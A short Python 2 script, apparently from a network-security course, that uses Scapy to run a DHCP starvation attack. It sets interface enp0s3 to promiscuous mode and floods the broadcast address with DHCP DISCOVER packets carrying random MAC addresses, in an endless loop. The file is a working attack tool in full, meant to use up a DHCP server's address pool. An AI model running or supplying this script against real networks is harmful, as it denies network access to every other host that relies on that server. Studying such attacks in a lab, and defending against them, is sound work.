#!/usr/bin/env python

#Importing the necessary modules
import logging
import random
import subprocess

#This will suppress all messages that have a lower level of seriousness than error messages.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
logging.getLogger("scapy.loading").setLevel(logging.ERROR)

#Importing Scapy and handling the ImportError exception
try:
    from scapy.all import *

except ImportError:
    print "Scapy package for Python is not installed on your system."
    print "Get it from https://pypi.python.org/pypi/scapy and try again."
    sys.exit()

#Setting network interface in promiscuous mode
subprocess.call(["ifconfig", "enp0s3", "promisc"], stdout = None, stderr = None, shell = False)

#Scapy normally makes sure that replies come from the same IP address the stimulus was sent to.
#But our DHCP packet is sent to the IP broadcast address (255.255.255.255) and any answer packet will have the IP address of the replying DHCP server as its source IP address (e.g. 192.168.1.111).
#Because these IP addresses don't match, we have to disable Scapy's check with conf.checkIPaddr = False before sending the stimulus.
conf.checkIPaddr = False

#Performing the DHCP starvation attack
def generate_dhcp_discover():
    #Defining some DHCP parameters
    x_id = random.randrange(1, 1000000)
    #print x_id
    
    #Assigning the .command() output of a captured DHCP DISCOVER packet to a variable
    dhcp_dis_pkt = Ether(dst = "ff:ff:ff:ff:ff:ff", src = RandMAC()) / IP(src = "0.0.0.0", dst = "255.255.255.255") / UDP(sport = 68, dport = 67) / BOOTP(op = 1, xid = x_id, chaddr = RandMAC()) / DHCP(options = [("message-type", "discover"), ("end")])
    
    #Sending the DISCOVER packet forever
    sendp(dhcp_dis_pkt, iface = "enp0s3", loop = 1, verbose = 0)

#Calling the function
generate_dhcp_discover()
